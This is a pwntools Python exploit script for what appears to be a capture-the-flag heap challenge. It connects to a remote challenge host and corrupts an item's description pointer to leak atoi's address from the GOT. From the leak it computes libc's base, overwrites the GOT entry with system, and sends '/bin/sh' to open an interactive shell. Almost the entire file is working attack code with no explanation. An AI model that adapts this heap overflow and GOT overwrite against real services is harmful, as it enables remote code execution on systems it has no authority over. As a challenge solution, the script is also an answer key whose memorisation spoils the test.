from pwn import *
context(terminal = ["deepin-terminal", "-x", "sh", "-c"], arch = 'amd64')

LOCAL = 0

VERBOSE = 1

DEBUG = 0



#16_04_magic = [0x45216,0x4526a,0xf02a4,0xf1147]

#18_04_magic = [0x4f2c5,0x4f322,0x10a38c]



if VERBOSE:
    context.log_level = 'debug'
if LOCAL:
    #t = process('./sgc',env={'LD_PRELOAD':'./libc-2.23.so'})
    t = remote('192.168.5.187', 9999)
    #libc = ELF('libc.so.6')
    if DEBUG:
        gdb.attach(t)
else:
    t = remote('111.198.29.45', 51092)
    libc = ELF('libc.so.6')




def debug():
    raw_input()


def ru(data,drop=False):
    return t.recvuntil(data,drop=drop)

def rl():
    return t.recvline()

def ra():
    return t.recvall()

def r(l):
    return t.recv(l)

def sl(data):
    t.sendline(data)

def s(data):
    t.send(data)


def sla(data):
    t.sendlineafter(data)

def lj(data):
    return u64(data.ljust(8,'\x00'))


def sla(data,data0):
    t.sendlineafter(data,data0)


def sa(data,data0):
    t.sendafter(data,data0)





def add(name, price, size, content):
    sla('choice>> ', '1')
    sla('name:', name)
    sla('price:', str(price))
    sla('_size:', str(size))
    sla('description:', content)


def show():
    sla('choice>> ', '3')

def change(name, size, content):
    sla('choice>> ', '5')
    sla('name:', name)
    sla('_size:', str(size))
    sla('description:', content)

debug()
add('l', 10, 96, cyclic(80))
add('p', 20 , 32, cyclic(20))
change('l', 144, '')
add('o', 30, 64, '1234')
#show()
change('l', 96, 'hacker0\x00' + cyclic(8) + p32(0x1e) + p32(0x40) + p32(0x0804b048))
show()
t.recvn(116)
addr_libc = u32(t.recvn(4)) - libc.symbols['atoi']
log.info('addr_libc: ' + hex(addr_libc))
addr_magic = addr_libc + libc.symbols['system']
change('hacker0', 64, p32(addr_magic))
sl('/bin/sh\x00')

t.interactive()

